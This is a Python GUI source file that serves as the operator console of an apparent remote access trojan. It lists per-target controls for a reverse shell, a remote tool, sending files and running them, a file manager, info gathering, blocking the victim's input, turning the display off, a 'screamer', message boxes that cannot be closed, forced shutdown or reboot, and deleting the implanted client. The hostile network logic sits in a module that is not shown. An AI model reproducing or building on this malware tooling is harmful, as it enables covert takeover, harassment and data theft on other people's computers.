import customtkinter as ctk
import soundpad
from server_gui import CommandFunction

class FunctionApp(ctk.CTk):
    def __init__(self, ip, port, server):
        super().__init__()
        
        self.title("Function")
        self.geometry("600x500")

        self.ip = ip
        self.port = port
        self.server = server
        self.comm = CommandFunction(self.server)#need for execute command from gui

        self.create_func_app()

    
    def create_func_app(self):
        self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='#1e1f26')
        self.gbw_func_title = ctk.CTkLabel(self.gbw_func_frame, text=f'Func for target: {self.ip}', text_color='white', font=('Bold', 25))
        
        self.tabview = ctk.CTkTabview(self)
        
        self.tabview.pack(side='top', fill='both', expand=True)
        self.gbw_func_frame.pack(side='top', fill='x')
        self.gbw_func_title.pack(side='top', pady=10)

        self.tabview.add("Fun")
        self.tabview.add("System")
        self.tabview.add("Files")
        self.tabview.add("Info")

        self.add_content_to_tabs()


    def add_content_to_tabs(self):
        "FUN TAB"
        self.fun_tab = self.tabview.tab("Fun")
        self.input_link = ctk.CTkEntry(self.fun_tab, width=300, height=40, placeholder_text='Enter a link', font=('Bold', 20), text_color='blue')

        self.open_link_btn = ctk.CTkButton(self.fun_tab, text="Open Link", height=50, width=200,
                                           command=lambda: self.comm.open_link(self.ip, self.port, self.input_link.get()), font=('Bold', 15),
                                             fg_color='#283655')
        
        self.blockinput_btn = ctk.CTkButton(self.fun_tab, text='Block Hot Keys/mouse', height=50, width=200,
                                command=lambda: self.comm.block_input(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        
        self.off_monitor_btn = ctk.CTkButton(self.fun_tab, text="Display Off", height=50, width=100,
                                           command=lambda: self.comm.display_controll(self.ip, self.port), font=('Bold', 15), fg_color='black')
        
        self.on_monitor_btn = ctk.CTkButton(self.fun_tab, text="Display On", height=50, width=95, text_color="black",
                                           command=lambda: self.comm.display_controll(self.ip, self.port, True), font=('Bold', 15), fg_color='white')
        
        self.set_wallppr_btn = ctk.CTkButton(self.fun_tab, text="Set Wallpaper", height=50, width=200,
                                           command=lambda: self.comm.set_wallpaper(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        
        self.screemer_btn = ctk.CTkButton(self.fun_tab, text="Screemer", height=50, width=200,
                                           command=lambda: self.comm.screemer(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        
        self.input_msg_box = ctk.CTkEntry(self.fun_tab, width=300, height=40, placeholder_text='Enter a message', font=('Bold', 20), text_color='blue')

        self.send_msg_btn = ctk.CTkButton(self.fun_tab, text="Send\nMsg Box", height=50, width=100,
                                           command=lambda: self.comm.msg_box(self.ip, self.port, self.input_msg_box.get()),
                                             font=('Bold', 15), fg_color='#283655')
        
        self.send_devilmsg_btn = ctk.CTkButton(self.fun_tab, text="Devil/Msg\n!No Close!", height=50, width=95,
                                           command=lambda: self.comm.msg_box(self.ip, self.port, self.input_msg_box.get(), True),
                                             font=('Bold', 15), fg_color='red')
        
        
        self.blockinput_btn.place(x=10, y=70)
        self.input_link.place(x=10, y=10)
        self.screemer_btn.place(x=330, y=140)
        self.open_link_btn.place(x=330, y=7)
        self.off_monitor_btn.place(x=330, y=70)
        self.on_monitor_btn.place(x=435, y=70)
        self.set_wallppr_btn.place(x=10, y=140)
        self.input_msg_box.place(x=10, y=202)
        self.send_msg_btn.place(x=330, y=200)
        self.send_devilmsg_btn.place(x=435, y=200)


        "SYSTEM TAB"
        self.sys_tab = self.tabview.tab("System")
        self.console_btn = ctk.CTkButton(self.sys_tab, text='Reverse Shell', height=50, width=200,
                                command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        
        self.off_btn = ctk.CTkButton(self.sys_tab, text='Off Pc', height=50, width=95,
                                command=lambda: self.comm.off_pc(self.ip, self.port), font=('Bold', 15), fg_color='black')
        
        self.reboot_btn = ctk.CTkButton(self.sys_tab, text='Reboot Pc', height=50, width=100,
                                command=lambda: self.comm.off_pc(self.ip, self.port, True), font=('Bold', 15), fg_color='grey')
        
        self.remote_btn = ctk.CTkButton(self.sys_tab, text='Remote Tool', height=50, width=200,
                                command=lambda: self.comm.remote_tool(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        
        self.restart_btn = ctk.CTkButton(self.sys_tab, text='RESTART EXE CLIENT', height=50, width=500, fg_color='#d0e1f9', text_color="black", 
                                       command=lambda: self.comm.post_msg(self.ip, self.port, "restart"), font=('Bold', 20))

        self.kill_btn = ctk.CTkButton(self.sys_tab, text='! DELETE CLIENT !', height=50, width=500, fg_color='#4d648d', text_color="yellow", 
                                       command=lambda: self.comm.killer(self.ip, self.port, True), font=('Bold', 20))

        self.disconnect_btn = ctk.CTkButton(self.sys_tab, text='CLIENT OFF', height=50, width=500, fg_color='#4d648d', text_color="red", 
                                       command=lambda: self.comm.killer(self.ip, self.port), font=('Bold', 20))
        
        self.off_btn.place(x=330, y=70)
        self.reboot_btn.place(x=430, y=70)
        self.restart_btn.pack(side='bottom', pady=10, padx=10)
        self.kill_btn.pack(side='bottom', pady=10, padx=10)
        self.disconnect_btn.pack(side='bottom', pady=10, padx=10)
        self.console_btn.place(x=10, y=10)
        self.remote_btn.place(x=330, y=10)
        

        "FILES TAB"
        self.file_tab = self.tabview.tab("Files")
        self.send_and_run_btn = ctk.CTkButton(self.file_tab, text='Run File From Disk', height=50, width=200,
                                       command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        
        self.send_file_btn = ctk.CTkButton(self.file_tab, text='SendFile', height=50, width=200,
                                       command=lambda: self.comm.send_file(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        
        self.file_manager_btn = ctk.CTkButton(self.file_tab, text='FileManager', height=50, width=200,
                                       command=lambda: self.comm.file_manager(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        

        self.file_manager_btn.pack(side='top', pady=10, padx=50)
        self.send_file_btn.pack(side='top', pady=10, padx=50)
        self.send_and_run_btn.pack(side='top', pady=10, padx=50)
        

        "INFO TAB"
        self.info_tab = self.tabview.tab("Info")
        self.get_info_btn = ctk.CTkButton(self.info_tab, text='Get Info', height=50, width=200,
                                       command=lambda: self.comm.get_info(self.ip, self.port), font=('Bold', 15), fg_color='#283655')
        
        self.get_info_btn.pack(side='top', pady=10, padx=50)

    @soundpad.play_click()
    def show_tab(self, tab_name):
        self.tabview.set(tab_name)